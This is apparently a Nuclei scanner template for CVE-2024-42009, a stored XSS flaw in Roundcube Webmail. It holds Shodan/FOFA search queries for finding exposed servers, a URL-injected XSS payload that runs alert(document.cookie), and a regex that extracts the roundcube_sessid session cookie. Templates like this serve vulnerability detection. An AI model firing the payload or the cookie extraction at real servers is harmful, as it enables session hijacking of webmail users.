id: CVE-2024-42009

info:
  name: Roundcube Webmail <=1.6.7 / <=1.5.7 Stored XSS (message_body desanitization)
  author: ye11oc4t
  severity: critical
  description: |
    Roundcube versions up to 1.5.7 and 1.6.x up to 1.6.7 contain a stored cross-site scripting
    vulnerability in message_body() (show.php).
    Attackers can send a crafted HTML email with malformed attributes.
    When the victim opens this mail in Roundcube (Elastic skin), the injected JavaScript executes
    in the victimâ€™s browser context, potentially exposing session cookies (`roundcube_sessid`) or
    enabling email exfiltration.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-42009
    - https://github.com/DaniTheHack3r/CVE-2024-42009-PoC
    - https://github.com/roundcube/roundcubemail/releases/tag/1.6.8
    - https://www.sonarsource.com/blog/government-emails-at-risk-critical-cross-site-scripting-vulnerability-in-roundcube-webmail/
  
  classification:
    cve-id: CVE-2024-42009
    cwe-id: CWE-79
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H
    cvss-score: 9.6
  metadata:
    verified: true
    shodan-query: cpe:"cpe:2.3:a:roundcube:webmail"
    fofa-query: 'body="roundcube" || title="roundcube"'
  tags: cve,cve2024,xss,roundcube,webmail,kev,stored

flow: http(1) && http(2)

http:
  - method: GET
    path:
      - "{{BaseURL}}/?_task=mail&_action=show&_uid=20&_mbox=INBOX&_extwin=1"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "roundcube"
          - "rcmail"
        condition: or

    extractors:
      - type: regex
        name: version
        part: body
        group: 1
        regex:
          - '"rcversion":\s*"([0-9.]+)"'
          - 'Roundcube Webmail\s+([0-9.]+)'

  - method: GET
    path:
      - "{{BaseURL}}/?_task=mail&_action=show&_uid=1&_mbox=INBOX&_extwin=1\"><body title=\"bgcolor=foo\" name=\"bar style=animation-name:progress-bar-stripes onanimationstart=alert(document.cookie) foo=bar\">"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        part: body
        regex:
          - "roundcube_sessid=[a-z0-9]+"   
      - type: word
        part: body
        words:
          - "onanimationstart"
          - "progress-bar-stripes"
        condition: and

    extractors:
      - type: regex
        name: session_id
        part: body
        group: 0
        regex:
          - "roundcube_sessid=[a-z0-9]+"
